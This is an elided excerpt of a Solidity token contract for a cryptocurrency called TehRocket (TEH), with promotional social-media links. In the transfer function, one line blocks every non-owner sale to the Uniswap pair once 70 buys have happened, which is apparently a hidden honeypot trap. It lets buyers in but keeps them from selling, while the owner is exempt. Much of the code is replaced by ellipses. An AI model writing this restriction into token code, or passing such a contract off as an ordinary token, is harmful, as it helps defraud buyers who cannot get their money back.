...
Website : www.TehRocket.com
Telegram : https://t.me/TehRocket
Twitter : https://twitter.com/TehRocketETH
...
contract TehRocket is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"TehRocket";
    string private constant _symbol = unicode"TEH";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if(to==uniswapV2Pair){require(_buyCount<70) ; }
        }
